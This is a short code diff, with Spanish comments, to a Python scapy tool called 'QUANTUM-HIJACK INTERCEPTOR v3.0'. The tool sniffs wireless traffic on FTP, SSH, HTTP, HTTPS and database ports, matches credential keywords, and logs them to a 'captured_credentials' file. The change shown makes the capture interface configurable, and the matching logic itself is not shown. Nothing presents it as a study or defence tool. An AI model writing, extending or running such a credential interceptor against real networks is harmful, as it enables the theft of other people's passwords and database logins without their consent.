@@ -12,6 +12,7 @@ from datetime import datetime
 from scapy.all import sniff, TCP, IP, Raw
 
 OUTPUTFILE = "logs/captured_credentials.json"
+CAPTURE_IFACE = sys.argv[1] if len(sys.argv) > 1 else os.getenv("MON_IFACE", "wlan0mon")
 
 # Palabras clave para detectar credenciales
 CREDENTIAL_PATTERNS = {
@@ -150,7 +151,7 @@ def main():
     print("="*60)
     print("🔥 QUANTUM-HIJACK INTERCEPTOR v3.0")
     print("="*60)
-    print("Escaneando tráfico en wlan0mon...")
+    print(f"Escaneando tráfico en {CAPTURE_IFACE}...")
     print("Puertos monitoreados: 21(FTP), 22(SSH), 80(HTTP), 443(HTTPS), 3306(MySQL), 5432(PostgreSQL), 27017(MongoDB)")
     print(f"Output: {OUTPUTFILE}")
     print("="*60)
@@ -160,7 +161,7 @@ def main():
         os.makedirs('logs', exist_ok=True)
         
         sniff(
-            iface='wlan0mon',
+            iface=CAPTURE_IFACE,
             prn=pkt_callback,
             filter='tcp port 21 or tcp port 22 or tcp port 80 or tcp port 443 or tcp port 3306 or tcp port 5432 or tcp port 27017',
             store=False,
